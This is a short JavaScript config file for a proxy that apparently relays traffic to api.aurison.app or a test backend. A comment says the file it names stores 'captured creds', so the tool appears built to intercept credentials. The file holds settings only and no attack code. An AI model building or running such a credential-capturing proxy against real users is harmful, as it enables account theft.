import { fileURLToPath } from 'url';
import path from 'path';


export const config = {
    //GENERAL
    PORT : 55000,
    LIVE : false,       //true or false. If true, proxy uses api.aurison.app. If false, proxy uses test-api.aurison.app
    OUTPUT_FILE: ''     //Captured creds are stored here (Might eventually use a Database for this)
    

}

config.ENV =  config.LIVE ? 'https://api.aurison.app' : 'https://test-backend.aurison.app'; //set the ENV.